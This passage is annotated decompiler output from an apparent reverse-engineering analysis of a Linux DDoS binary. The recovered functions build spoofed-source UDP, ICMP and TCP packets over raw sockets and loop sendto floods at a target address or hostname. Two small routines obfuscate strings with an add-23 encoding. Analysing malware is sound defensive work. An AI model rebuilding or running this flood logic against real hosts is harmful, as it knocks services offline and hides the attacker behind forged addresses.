		    // eax = random() % 30000;
                }
                *Vfffff988 = htons(ax);
                ebx = Vfffff988;
                *(ebx + 2) = 13568;
                *(ebx + 4) = htons(*(ebp + esi * 4 - 36) + 8);
                *(ebx + 6) = 0;
                if(Vfffff99c != 0 || Vfffff998 != 0 || Vfffff994 != 0 || Vfffff990 != 0) {
                    Vfffff9e4 = Vfffff99c;
                    Vfffff9e5 = Vfffff998;
                    Vfffff9e6 = Vfffff994;
                    Vfffff9e7 = Vfffff990;
                } else {
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e4 = dl + al;
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e5 = dl + al;
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e6 = dl + al;
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e7 = dl + al;
                }
                if(A34 == 0) {
                    Vfffff9e8 = Vfffff9ac;
                    Vfffff9e9 = Vfffff9a8;
                    Vfffff9ea = Vfffff9a4;
                    Vfffff9eb = Vfffff9a0;
                }
                *edi = 69;
                random();
                ebx = 130;
                asm("cdq");
                *(edi + 8) = ebx / ebx % ebx / ebx + 120;
		// *(edi + 8) = (random() % 130) + 120;
                random();
                ebx = 255;
                asm("cdq");
                *(edi + 4) = ebx / ebx % ebx / ebx;
		// *(edi + 4) = random() % 255;
                *(edi + 9) = 17;
                *(edi + 6) = 0;
                *(edi + 2) = htons(*(ebp + esi * 4 - 36) + 28);
                *(edi + 10) = 0;
                edx = 20;
                Vfffff974 = & Vfffff9d8;
                ecx = 0;
                Vfffff9b2 = 0;
                do {
                    ebx = Vfffff974;
                    ecx = ecx + ( *ebx & 65535);
                    ebx = ebx + 2;
                    Vfffff974 = ebx;
                    edx = edx + -2;
                } while(edx > 1);
                != ? 0x8049933 : ;
                Vfffff9b2 = *ebx;
                ecx = ecx + (Vfffff9b2 & 65535);
                edx = ecx >> 16;
                ecx = (cx & 65535) + edx;
                ax = !(ecx + (ecx >> 16));
                Vfffff9b2 = ax;
                *(edi + 10) = Vfffff9b2;
                sendto(Vfffff98c, & Vfffff9d8, *(ebp + esi * 4 - 36) + 28, 0, & Vfffffdd8, 16);
                if(A28 != 0) {
                    if(Vfffff980 != A28) {
                        Vfffff980 = Vfffff980 + 1;
                        goto L080499c2;
                    }
                    precise_sleep(300);
                    Vfffff980 = 0;
                } else {
                    precise_sleep(300);
                }
                Vfffff97c = Vfffff97c - 1;
L080499c2:
                Vfffff978 = Vfffff978 + 50;
                esi = esi + 1;
            } while(esi <= 8);
        }
        goto L080496cc;
    }
    globalvar002 = 0;
    esp = ebp + -1688;
    return(0);
}



L080499F4(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff60;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff6c;
	/* unknown */ void  Vffffff70;
	/* unknown */ void  Vffffff74;
	/* unknown */ void  Vffffff78;
	/* unknown */ void  Vffffff7c;
	/* unknown */ void  Vffffff80;
	/* unknown */ void  Vffffff84;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffff8e;
	/* unknown */ void  Vffffff90;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd2;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd6;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffd9;
	/* unknown */ void  Vffffffda;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe5;
	/* unknown */ void  Vffffffe6;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    Vffffff84 = A10;
    Vffffff80 = A14;
    Vffffff7c = A18;
    Vffffff78 = A1c;
    Vffffff74 = A20;
    Vffffff70 = A24;
    Vffffff6c = A28;
    Vfffffff0 = 2;
    random();
    ecx = 255;
    asm("cdq");
    eax = ecx / ecx % ecx / ecx;
    // eax = random() % 255;
    Vfffffff2 = htons(ax);
    esi = & Vffffff90;
    sprintf(esi, "%d.%d.%d.%d", Vffffff74 & 255, Vffffff70 & 255, Vffffff6c & 255, A2c & 255);
    if(A30 == 0) {
        ebx = & Vffffffb0;
        sprintf();
        Vfffffff4 = L0804CE8C(ebx, ebx, "%d.%d.%d.%d", Vffffff84 & 255, Vffffff80 & 255, Vffffff7c & 255, Vffffff78 & 255);
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffff68 = eax;
    if(Vffffff68 > 0) {
        Vffffffd0 = 69;
        Vffffffd2 = 7208;
        Vffffffd4 = 21764;
        random();
        ecx = 130;
        asm("cdq");
        Vffffffd8 = ecx / ecx % ecx / ecx + 120;
	// Vffffffd8 = (random() % 130) + 120;
        Vffffffdc = L0804CE8C(esi);
        if(A30 == 0) {
            Vffffffe0 = L0804CE8C( & Vffffffb0);
        }
        Vffffffd6 = 65055;
        Vffffffda = 0;
        if(A8 != 0) {
            Vffffffd9 = 17;
            random();
            ecx = 255;
            asm("cdq");
            eax = ecx / ecx % ecx / ecx;
	    // eax = random() + 255;
            Vffffffe4 = htons(ax);
            Vffffffe6 = htons(Ac);
            Vffffffe8 = 2304;
            edx = 9;
            esi = & Vffffffe4;
            ebx = 0;
            Vffffff8e = 0;
            do {
                ebx = ebx + ( *esi & 65535);
                esi = esi + 2;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x8049b89 : ;
            Vffffff8e = *esi;
            ebx = ebx + (Vffffff8e & 65535);
            edx = ebx >> 16;
            ebx = (bx & 65535) + edx;
            ebx = ebx + (ebx >> 16);
            ax = !ebx;
            Vffffff8e = ax;
            Vffffffea = Vffffff8e;
            Vffffffec = 97;
        } else {
            Vffffffd9 = 1;
            Vffffffe4 = 8;
            Vffffffe5 = 0;
            Vffffffe6 = 0;
            edx = 9;
            esi = & Vffffffe4;
            ebx = 0;
            Vffffff8e = 0;
            do {
                ebx = ebx + ( *esi & 65535);
                esi = esi + 2;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x8049bf1 : ;
            Vffffff8e = *esi;
            ebx = ebx + (Vffffff8e & 65535);
            edx = ebx >> 16;
            ebx = (bx & 65535) + edx;
            ebx = ebx + (ebx >> 16);
            ax = !ebx;
            Vffffff8e = ax;
            Vffffffe6 = Vffffff8e;
        }
        Vffffff64 = 29;
        edx = 20;
        esi = & Vffffffd0;
        ebx = 0;
        Vffffff8e = 0;
        do {
            ebx = ebx + ( *esi & 65535);
            esi = esi + 2;
            edx = edx + -2;
        } while(edx > 1);
        != ? 0x8049c49 : ;
        Vffffff8e = *esi;
        ebx = ebx + (Vffffff8e & 65535);
        edx = ebx >> 16;
        Vffffff8e = !(ebx + ((bx & 65535) + edx >> 16));
        Vffffffda = Vffffff8e;
        ebx = 0;
        Vffffff60 = & Vfffffff0;
        for(edi = & Vffffffd0; 1; ebx = ebx - 1) {
            esi = 0;
            if(A30 != 0 && ebx <= 0) {
                edx = gethostbyname(A34);
                if(edx != 0) {
L08049cac:
                    bcopy( *( *(edx + 16)), & Vffffff88, 4);
                    eax = Vffffff88;
                    Vffffffe0 = eax;
                    Vfffffff4 = Vffffffe0;
                    ebx = 40000;
                } else {
                    sleep(600);
                    esi = 1;
                }
            }
            if(esi == 0) {
                sendto();
                sendto(Vffffff68, edi, Vffffff64, 0, Vffffff60, 16, Vffffff68, edi, Vffffff64, 0, Vffffff60, 16);
                precise_sleep(20);
            }
        }
        goto L08049cac;
    }
    globalvar002 = 0;
    esp = ebp + -172;
    return(0);
}



L08049D40(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38, A3c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
/* unknown */ void  A38;
/* unknown */ void  A3c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff34;
	/* unknown */ void  Vffffff38;
	/* unknown */ void  Vffffff3c;
	/* unknown */ void  Vffffff40;
	/* unknown */ void  Vffffff44;
	/* unknown */ void  Vffffff48;
	/* unknown */ void  Vffffff4c;
	/* unknown */ void  Vffffff50;
	/* unknown */ void  Vffffff54;
	/* unknown */ void  Vffffff58;
	/* unknown */ void  Vffffff5c;
	/* unknown */ void  Vffffff62;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb1;
	/* unknown */ void  Vffffffb2;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffc9;
	/* unknown */ void  Vffffffca;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffce;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd1;
	/* unknown */ void  Vffffffd2;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffde;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffe9;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vffffffee;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    Vffffff5c = A8;
    Vffffff58 = Ac;
    Vffffff54 = A10;
    Vffffff38 = A14;
    Vffffff50 = A24;
    Vffffff4c = A28;
    Vffffff48 = A2c;
    Vffffff44 = A30;
    if(A34 != 0) {
        A34 = A34 - 1;
    }
    L080559A0(time(0));
    Vfffffff0 = 2;
    random();
    ebx = 255;
    asm("cdq");
    eax = ebx / ebx % ebx / ebx;
    // eax = random() % 255;
    Vfffffff2 = htons(ax);
    if(A38 == 0) {
        ebx = & Vffffff88;
        sprintf(ebx, "%d.%d.%d.%d", Vffffff5c & 255, Vffffff58 & 255, Vffffff54 & 255, Vffffff38 & 255);
        Vfffffff4 = L0804CE8C(ebx);
    }
    Vffffffc8 = 69;
    Vffffffca = 10240;
    Vffffffc9 = 0;
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffff40 = eax;
    if(Vffffff40 > 0) {
        if(A20 != 0) {
            sprintf( & Vffffff68, "%d.%d.%d.%d", Vffffff50 & 255, Vffffff4c & 255, Vffffff48 & 255, Vffffff44 & 255);
        }
        if(A38 == 0) {
            Vffffffd8 = L0804CE8C( & Vffffff88);
        }
        Vffffffce = 0;
        Vffffffd1 = 6;
        Vffffffe9 = Vffffffe9 & 239;
        al = Vffffffe8 & 15 | 80;
        Vffffffe8 = al;
        Vffffffe4 = 0;
        Vffffffe8 = Vffffffe8 & 80;
        Vffffffe9 = 2;
        Vffffffee = 0;
        Vffffffde = ntohs((A18 << 8) + A1c);
        edi = 0;
        Vffffffb0 = 0;
        if(A38 == 0) {
            Vffffffac = Vffffffd8;
        }
        Vffffffb1 = 6;
        Vffffffb2 = 5120;
        esi = 0;
        for(Vffffff3c = & Vffffffa8; 1; esi = esi - 1) {
            Vffffff34 = 0;
            if(A38 != 0 && esi <= 0) {
                edx = gethostbyname(A3c);
                if(edx != 0) {
L08049f30:
                    bcopy( *( *(edx + 16)), & Vffffff64, 4);
                    eax = Vffffff64;
                    Vffffffd8 = eax;
                    Vfffffff4 = eax;
                    Vffffffac = Vfffffff4;
                    esi = 40000;
                } else {
                    sleep(600);
                    Vffffff34 = 1;
                }
            }
            if(Vffffff34 != 0) {
                continue;
            }
            rand();
            ebx = 3089;
            asm("cdq");
            ah = ebx / ebx % ebx / ebx + 2;
	    // ah = (rand() % 3089) + 2;
            Vffffffcc = htons(ax);
            rand();
            ebx = 1401;
            asm("cdq");
            ax = ebx / ebx % ebx / ebx + 200;
	    // ax = (rand() % 1401) + 200;
            Vffffffea = htons(ax);
            rand();
            ebx = 40000;
            asm("cdq");
            ax = ebx / ebx % ebx / ebx + 1;
	    // ax = (rand() % 4000) + 1;
            Vffffffdc = htons(ax);
            rand();
            ebx = 40000000;
            asm("cdq");
            eax = ebx / ebx % ebx / ebx + 1;
	    // eax = (rand() % 40000000) + 1;
            asm("xchg al,ah");
            asm("ror eax,0x10");
            asm("xchg al,ah");
            Vffffffe0 = eax;
            rand();
            ebx = 116;
            asm("cdq");
            Vffffffd0 = ebx / ebx % ebx / ebx + 125;
	    // Vffffffd0 = (rand() % 116) + 125;
            if(A20 == 0) {
                random();
                ebx = 255;
                asm("cdq");
                ebx = ebx / ebx;		
                (save)ebx % ebx;
                random();
                asm("cdq");
                ebx = ebx / ebx;
                (save)ebx % ebx;
                random();
                asm("cdq");
                ebx = ebx / ebx;
                (save)ebx % ebx;
                random();
                asm("cdq");
                (save)ebx / ebx % ebx / ebx;
                (save)"%u.%u.%u.%u";
                (save) & Vffffff68;
                sprintf();

		// I think what's happening here is:
		// sprintf(& Vffffff68, "%u.%u.%u.%u", (random() % 255),
		//         (random() % 255), (random() % 255), (random() % 255))

                esp = esp + 24;
            }
	    eax = L0804CE8C(& Vffffff68);
            Vffffffd4 = eax;
            Vffffffa8 = Vffffffd4;
            Vffffffec = 0;
            Vffffffd2 = 0;
            bcopy(& Vffffffdc, & Vffffffb4, 20);
            esp = esp + 16;
            edx = 32;
            Vffffff34 = Vffffff3c;
            ecx = 0;
            Vffffff62 = 0;
            do {
                ebx = Vffffff34;
                ecx = ecx + ( *ebx & 65535);
                ebx = ebx + 2;
                Vffffff34 = ebx;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x804a097 : ;
            Vffffff62 = *ebx;
            ecx = ecx + (Vffffff62 & 65535);
            edx = ecx >> 16;
            Vffffff62 = !(ecx + ((cx & 65535) + edx >> 16));
            Vffffffec = Vffffff62;
            edx = 20;
            Vffffff34 = & Vffffffc8;
            ecx = 0;
            Vffffff62 = 0;
            do {
                ebx = Vffffff34;
                ecx = ecx + ( *ebx & 65535);
                ebx = ebx + 2;
                Vffffff34 = ebx;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x804a103 : ;
            Vffffff62 = *ebx;
            ecx = ecx + (Vffffff62 & 65535);
            edx = ecx >> 16;
            ecx = (cx & 65535) + edx;
            ax = !(ecx + (ecx >> 16));
            Vffffff62 = ax;
            Vffffffd2 = Vffffff62;
            sendto(Vffffff40, & Vffffffc8, 40, 0, & Vfffffff0, 16);
            if(A34 != 0) {
                if(A34 != edi) {
                    edi = edi + 1;
                    continue;
                }
                precise_sleep(300);
                edi = 0;
            } else {
                precise_sleep(300);
            }
        }
        goto L08049f30;
    }
    globalvar002 = 0;
    esp = ebp + -216;
    return(0);
}



L0804A194(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    *A10 = globalvar005;
    eax = sprintf(A10, "%c", *Ac + 23);
    ecx = 1;
    if(1 != A8) {
        do {
            edx = *(A10 + ecx - 1) & 255;
            eax = edx + ( *(ecx + Ac) & 255) + 23;
            *(ecx + A10) = al;
            ecx = ecx + 1;
        } while(ecx != A8);
    }
}



L0804A1E8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    ebx = A8 - 1;
    al = A8 + 3 & 252;
    esp = esp - eax;
    Vfffffffc = esp;
    *A10 = globalvar005;
    if(ebx >= 0) {
        do {
            edx = ebx - 1;
            if(ebx == 0) {
                eax = *Ac & 255;
            } else {
                esi = Ac;
                eax = *(ebx + esi) & 255;
                eax = eax - ( *(edx + esi) & 255);
            }
            ecx = eax - 23;
            if(ecx < 0) {
                do {
                } while(ecx = ecx + 256);
            }
            edx = 0;
            if(0 < A8) {
                do {
                    al = *(edx + A10);
                    *(edx + Vfffffffc) = al;
                    edx = edx + 1;
                } while(edx < A8);
            }
            *A10 = cl;
            edx = 1;
            if(1 < A8) {
                do {
                    al = *(edx + Vfffffffc - 1);
                    *(edx + A10) = al;
                    edx = edx + 1;
                } while(edx < A8);
            }
            eax = sprintf(A10, "%c%s", ecx, Vfffffffc);
        } while(ebx = ebx - 1);
    }
    esp = ebp - 16;
}

// last procedure that definitely does not belong to C-library

L0804CE8C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    if(L0804CEB4(A8, & Vfffffffc) == 0) {
        return(-1);
    }
    esp = ebp;
    return(Vfffffffc);
}



L0804CEB4(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    for(Vffffffe8 = & Vfffffff0; 1; ebx = ebx + 1) {
        esi = 0;
        Vffffffec = 10;
        if(*ebx == 48) {
            ebx = ebx + 1;
            if(*ebx != 120) {
                if(*ebx == 88) {
                    goto L0804cee1;
                }
L0804ceec:
                Vffffffec = 8;
            } else {
L0804cee1:
                Vffffffec = 16;
                ebx = ebx + 1;
            }
        }
        al = *ebx;
        if(al != 0) {
            edi = globalvar016;
            do {
                if(al >= 0) {
                    edx = al & 255;
                    if(!( *(edi + edx * 2 + 1) & 8)) {
                        goto L0804cf0e;
                    }
                }
                if(Vffffffec != 16 || al < 0) {
                    break;
                }
                eax = eax & 255;
                if(*(edi + eax * 2 + 1) & 16) {
                    break;
                }
                ecx = eax + 10;
                Vffffffe4 = ecx;
                edx = esi << 4;
                if(*(edi + eax * 2 + 1) & 2) {
                    esi = Vffffffe4 + edx - 65;
                } else {
                    esi = ecx + edx - 97;
                    goto L0804cf53;
L0804cf0e:
                    eax = Vffffffec;
                    esi = esi * eax;
                    esi = edx + eax - 48;
                }
L0804cf53:
                ebx = ebx + 1;
                al = *ebx;
            } while(al != 0);
        }
        if(*ebx != 46) {
            goto L0804cf84;
        }
        eax = & Vfffffffc;
        if(Vffffffe8 >= eax || esi > 255) {
            goto L0804cfec;
        }
        ecx = Vffffffe8;
        *ecx = esi;
        Vffffffe8 = ecx + 4;
    }
    goto L0804ceec;
L0804cf84:
    if(*ebx != 0) {
        < ? L0804cfec : ;
        edx = *ebx & 255;
        if(*( globalvar016 + edx * 2 + 1) & 32) {
            goto L0804cfec;
        }
    }
    eax = (Vffffffe8 - & Vfffffff0 >> 2) + 1;
    if(eax != 2) {
        <= ? L0804d008 : ;
        if(eax == 3) {
            goto L0804cfcc;
        }
        if(eax == 4) {
            goto L0804cfe4;
        }
    } else {
        if(esi <= 16777215) {
            eax = Vfffffff0 << 24;
            goto L0804d006;
L0804cfcc:
            if(esi <= 65535) {
                eax = Vfffffff0 << 24;
                edx = Vfffffff4 << 16;
                goto L0804d004;
L0804cfe4:
                if(esi <= 255) {
                    goto L0804cff0;
                }
            }
        }
L0804cfec:
        eax = 0;
        goto L0804d021;
L0804cff0:
        eax = Vfffffff0 << 24 | Vfffffff4 << 16;
        edx = Vfffffff8 << 8;
L0804d004:
        eax = eax | edx;
L0804d006:
        esi = esi | eax;
    }
    if(Ac != 0) {
        eax = esi;
        asm("xchg al,ah");
        asm("ror eax,0x10");
        asm("xchg al,ah");
        *Ac = eax;
    }
    eax = 1;
L0804d021:
    esp = ebp - 40;
}


// first procedure that definitely belongs to C-library



//       Some code calls select with all three sets empty, n  zero,
//       and  a  non-null timeout as a fairly portable way to sleep
//       with subsecond precision.
//L080555B0(A8)
precise_sleep(ms)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = A8;
    edx = 0;
    edx = 1000000 / 1000000 % 1000000 / 1000000;
    Vfffffff8 = eax;
    edx = (eax << 5) - eax;
    eax = ((edx << 6) - edx << 3) + Vfffffff8 << 6;
    Vfffffffc = A8 - eax;
    return(select(1, 0, 0, 0, & Vfffffff8));
}



// seems to take time_t as parameter
L080559A0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    eax = *L08078958;
    *eax = A8;
    if(*L0807895C != 0) {
        esi = 1;
        if(*L08078960 > 1) {
            edi = *L08078958;
            eax = *L08078960 - 1 & 3;
            if(*L08078960 > 1) {
                if(eax == 0) {
                    goto L08055a9c;
                }
                if(eax > 1) {
                    if(eax > 2) {
                        ecx = *edi;
                        edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                        edx = ecx + (edx + (edx << 10)) * 2;
                        *(edi + 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                        esi = 2;
                    }
                    ecx = *(edi + esi * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + esi * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    esi = esi + 1;
                }
            }
            ecx = *(edi + esi * 4 - 4);
            edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
            edx = ecx + (edx + (edx << 10)) * 2;
            *(edi + esi * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
            esi = esi + 1;
            if(*L08078960 > esi) {
L08055a9c:
                do {
                    ecx = *(edi + esi * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + esi * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    ebx = esi + 1;
                    ecx = *(edi + ebx * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + ebx * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    ebx = esi + 2;
                    ecx = *(edi + ebx * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + ebx * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    ebx = esi + 3;
                    ecx = *(edi + ebx * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + ebx * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    esi = esi + 4;
                } while(*L08078960 > esi);
            }
        }
        *L08078950 = *L08078964 * 4 + *L08078958;
        *L08078954 = *L08078958;
        for(esi = 0; 1; esi = esi + 1) {
            eax = *L08078960;
            if(esi >= eax + eax * 8 + eax) {
                break;
            }
            random();
        }
    }
}


L08055F08(A8)
/* unknown */ void  A8;
{



    eax = L08055F34();
    if(eax != 0) {
        *eax = 2;
        *(eax + 4) = A8;
        eax = 0;
    } else {
        eax = -1;
    }
}


L08055F34()
{

    ecx = *L08078AF4;
    do {
        edx = 0;
        if(*(ecx + 4) > 0) {
            eax = 0;
            do {
                if(*(eax + ecx + 8) == 0) {
                    goto L08055f98;
                }
                eax = eax + 12;
                edx = edx + 1;
            } while(*(ecx + 4) != edx);
        }
        if(*(ecx + 4) <= 31) {
            goto L08055fa0;
        }
        ecx = *ecx;
    } while(ecx != 0);
    ecx = malloc(392);
    if(ecx != 0) {
        *ecx = *L08078AF4;
        *L08078AF4 = ecx;
        *(ecx + 4) = 1;
        return(ecx + 8);
L08055f98:
        eax = ecx + eax + 8;
        esp = ebp;
        return;
L08055fa0:
        eax = ecx + ( *(ecx + 4) + *(ecx + 4) * 2) * 4 + 8;
        *(ecx + 4) = *(ecx + 4) + 1;
        esp = ebp;
        return;
    }
    esp = ebp;
    return(0);
}



//L08055FBC()
some_sort_of_cleanup()
{



    (save)ebp;
    ebp = esp;
    (save)edi;
    (save)esi;
    (save)ebx;
    edi = *L08078AF4;
    do {
        ebx = *(edi + 4);
        eax = ebx;
        ebx = ebx - 1;
        if(eax != 0) {
            esi = (ebx + ebx * 2) * 4 + 8;
            do {
                edx = esi + edi;
                eax = *edx;
                if(eax == 1) {
                    *( *(edx + 4))( *(ebp + 8), *(edx + 8));
                } else {
                    < ? L0805600d : ;
                    if(eax == 2) {
                        *( *(edx + 4))();
                    }
                }
                eax = ebx;
                esi = esi + -12;
                ebx = ebx - 1;
            } while(eax != 0);
        }
        edi = *edi;
    } while(edi != 0);
    L08062188();
    exit(*(ebp + 8));
}


// this function seems to take the address of a buffer, a pointer to
// the hostend struct (as the one returned by gethostbyname) that points 
// to the first ip address, and the length of the field in bytes
// I think it writes the first address into the buffer

L0805652C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  edi;

	

    edx = A10;
    edi = A8;
    if(edx > 7) {

      // some sort of memcopying, aligned on word boundary

        eax = ~A8 & 3;
        edx = edx - eax;
        ecx = eax;
        asm("cld");
        asm("rep movsb");
        ecx = edx >> 2;
        asm("cld");
        asm("rep movsd");
        edx = edx & 3;
    }
    ecx = edx;
    asm("cld");
    asm("rep movsb");
    return(A8);
}


//L080569BC(A8, Ac)
signal_action(signum, handler) {
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;

	// filling of struct sigaction: 
	// struct sigaction {
	//        union {
	//          __sighandler_t _sa_handler;
	//          void (*_sa_sigaction)(int, struct siginfo *, void *);
	//        } _u;
	//        sigset_t sa_mask;
	//        unsigned long sa_flags;
	//        void (*sa_restorer)(void);
	// };


    Vfffffff0 = Ac; // probably latter case of union 
    Vfffffff4 = 0;  // sa_mask
    Vfffffff8 = -536870912; // sa_flags: SA_NOMASK | SA_ONESHOT

    edx = -1;
    if(sigaction(A8, & Vfffffff0, & Vffffffe0) != -1) {
        edx = Vffffffe0;
    }
    return(edx);
}


L08056D44(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    ebx = 134641100;
    if(134641100 < 0x80675d0) {
        eax = 4;
        if(134641100 < 0x80675d0) {
            if(4 == 0) {
                goto L08056dc8;
            }
            if(4 > 4) {
                if(4 > 8) {
                    if(4 >= 13) {
                        goto L08056dc8;
                    }
                    *( *L080675CC)(A8, Ac, A10);
                    ebx = 0x80675d0;
                }
                *( *ebx)(A8, Ac, A10);
                ebx = ebx + 4;
            }
        }
        eax = *( *ebx)(A8, Ac, A10);
        ebx = ebx + 4;
        if(ebx < 0x80675d0) {
L08056dc8:
            do {
                *( *ebx)(A8, Ac, A10);
                *( *(ebx + 4))(A8, Ac, A10);
                *( *(ebx + 8))(A8, Ac, A10);
                eax = *( *(ebx + 12))(A8, Ac, A10);
                ebx = ebx + 16;
            } while(ebx < 0x80675d0);
        }
    }
}



L0805756C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffe;



    if(A8 == 0) {
        edx = 4991;
    }
    asm("fnstcw [ebp-0x2]");
    ax = Vfffffffe & 61632;
    Vfffffffe = ax;
    ax = edx & 3903;
    Vfffffffe = ax | Vfffffffe;
    asm("fldcw [ebp-0x2]");
}




L08057F48(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(!(eax = A10 - 1)) {
        do {
            ecx = *(A8 + eax * 4);
            edx = *(Ac + eax * 4);
            if(ecx != edx) {
                goto L08057f70;
            }
        } while(eax = eax - 1);
    }
    eax = 0;
    goto L08057f7e;
L08057f70:
    eax = -1;
    if(ecx > edx) {
        eax = 1;
    }
L08057f7e:
}


L0805876C(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
